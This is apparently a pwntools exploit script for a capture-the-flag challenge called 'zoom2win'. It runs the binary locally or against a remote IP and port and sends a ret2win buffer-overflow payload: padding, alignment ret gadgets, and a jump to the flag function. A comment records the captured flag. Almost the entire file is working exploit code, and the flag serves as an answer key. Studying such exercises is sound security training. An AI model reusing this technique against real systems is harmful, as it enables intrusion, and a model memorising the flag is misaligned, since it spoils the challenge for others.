import sys
from pwn import *

# Flag : kqctf{did_you_zoom_the_basic_buffer_overflow_?}

if sys.argv[1] == "local":
        elf = ELF("./zoom2win")
        prog = elf.process()
if sys.argv[1] == "remote":
        prog = remote('143.198.184.186', 5003)

print(prog.recvuntil("\n"))
padding = b"A"*40
ret_for_allignment = p64(0x0040101a)
flag_addr = p64(0x00401196)
payload = padding + ret_for_allignment*3  + flag_addr
print(payload)
prog.sendline(payload)
print(prog.recvuntil("\n"))

prog.interactive()
